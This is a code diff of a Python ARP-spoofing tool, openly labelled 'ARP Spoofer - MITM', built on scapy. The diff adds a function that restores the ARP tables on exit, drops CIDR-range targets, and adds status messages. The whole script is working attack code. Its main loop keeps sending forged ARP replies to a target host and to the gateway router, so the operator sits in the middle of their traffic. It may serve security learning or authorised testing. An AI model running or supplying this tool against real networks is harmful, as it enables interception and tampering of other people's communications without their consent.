@@ -13,6 +13,7 @@ from termcolor import colored
 # Controlled quite
 def def_handler(sig, frame):
     print(colored("\n[!] Quitting the program...\n", "red"))
+    revert_spoof()
     sys.exit(1)
 
 signal.signal(signal.SIGINT, def_handler) # CTRL + C
@@ -20,9 +21,9 @@ signal.signal(signal.SIGINT, def_handler) # CTRL + C
 # Menu arguments
 def get_arguments():
     argparser = argparse.ArgumentParser(description="ARP Spoofer - MITM")
-    argparser.add_argument("-t", "--taret", dest="target", required=True, help="Host / IP Range. (Ex: 192.168.1.2 / 192.168.1.0/21)") # arget argument
-    argparser.add_argument("-r", "--router", dest="router", required=True, help="Gateway IP of router. (Ex: 192.168.1.1)") # arget argument
-    argparser.add_argument("-m", "--mac", dest="mac_address", required=True, help="Your current mac addreess. (Ex: aa:bb:cc:44:55:66)") # arget argument
+    argparser.add_argument("-t", "--taret", dest="target", required=True, help="Host / IP Range. (Ex: 192.168.1.2 / 192.168.1.0/21)") # target argument
+    argparser.add_argument("-r", "--router", dest="router", required=True, help="Gateway IP of router. (Ex: 192.168.1.1)") # router ip argument
+    argparser.add_argument("-m", "--mac", dest="mac_address", required=True, help="Your current mac addreess. (Ex: aa:bb:cc:44:55:66)") # mac_address argument
     argparser.add_argument("-i", "--interface", dest="interface", required=True, help="Network Interface Name. (Ex: wlan0)") # interface argument
 
     args = argparser.parse_args() # get arguments
@@ -39,18 +40,16 @@ def verify(target, interface, router_ip, hwsrc):
 
     ip_re = r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"
 
-    match = True if re.match(ip_re, target) or re.match(r"^([0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$", target) else False # Verify target format
+    match = True if re.match(ip_re, target) else False # Verify target format
     match_router = True if re.match(ip_re, router_ip) else False # Verify gateway format
     match_mac = True if re.match(r"^([a-fA-F0-9]{0,2}\:){5}[a-fA-F0-9]{0,2}$", hwsrc) else False # Verify mac address format
-
-    if match and ('/' in target):
-        match = True if int(target.split('/')[1]) < 33 else False # Verify correct bitmask (< 33)
 
     interfaces = [i[1] for i in socket.if_nameindex()] # Get all Local Network Interfaces Names
     valid_interface = True if interface in interfaces else False # Verify if the given Network Interface Name is in the PC
 
     return match and valid_interface and match_router and match_mac # Return True if all is correct
 
+# Get destination mac from target
 def get_dst_mac(ip, interface, retries=40):
     for retry in range(retries):
         arp_packet = scapy.ARP(pdst=ip)
@@ -58,10 +57,10 @@ def get_dst_mac(ip, interface, retries=40):
 
         arp_packet = broadcast_packet / arp_packet
 
-        answered_list = scapy.srp(arp_packet, iface=interface, timeout=1, verbose=False)[0]
+        answered_list = scapy.srp(arp_packet, iface=interface, timeout=1, verbose=False)[0] # get the anwers
 
         if answered_list:
-            return answered_list[0][1].hwsrc
+            return answered_list[0][1].hwsrc # get and return the hardware source (Mac Address)
 
     else:
         return None
@@ -70,23 +69,39 @@ def get_dst_mac(ip, interface, retries=40):
 def spoof(target_ip, interface, router_ip, hwsrc, hwdst):
     arp_packet = scapy.ARP(op=2, pdst=target_ip, psrc=router_ip, hwsrc=hwsrc, hwdst=hwdst)
     broadcast_packet = scapy.Ether(dst=hwdst)
+
+    packet = broadcast_packet/arp_packet
+
+    scapy.sendp(packet, verbose=False, iface=interface)
+
+def revert_spoof():
+    global target_mac, router_mac, interface, target, router_ip
+
+    # Revert for target
+    spoof(target, interface, router_ip, target_mac, router_mac)
     
-    packet = broadcast_packet / arp_packet
+    # Revert for router
+    spoof(router_ip, interface, target, router_mac, target_mac)
 
-    scapy.sendp(packet, verbose=False,iface=interface)
-
+# Main logic
 def main():
+    global target_mac, router_mac, target, interface, router_ip, hwsrc
+
     target, interface, router_ip, hwsrc = get_arguments() # get arguments
     isValid = verify(target, interface, router_ip, hwsrc) # Verify format arguments
 
     if isValid:
+        print(colored("\n[+] Getting destination Mac Addresses...\n", "yellow"))
         target_mac =  get_dst_mac(target, interface)
         router_mac =  get_dst_mac(router_ip, interface)
     
         if not target_mac or not router_mac:
-            print(colored("\n[!] Error when try getting destination mac address.\n", "red"))
+            print(colored("\n[!] Error: Failed to get destination mac address.\n", "red"))
             sys.exit(1)
+        else:
+            print(colored("\n[+] Destination Mac was succesfully obtained.\n", "green"))
 
+        print(colored(f"\n[+] Now you are a Man-In-The-Middle for {target} target.\n", "blue"))
         while True:
             spoof(target, interface, router_ip, hwsrc, target_mac)
             spoof(router_ip, interface, target, hwsrc, router_mac)
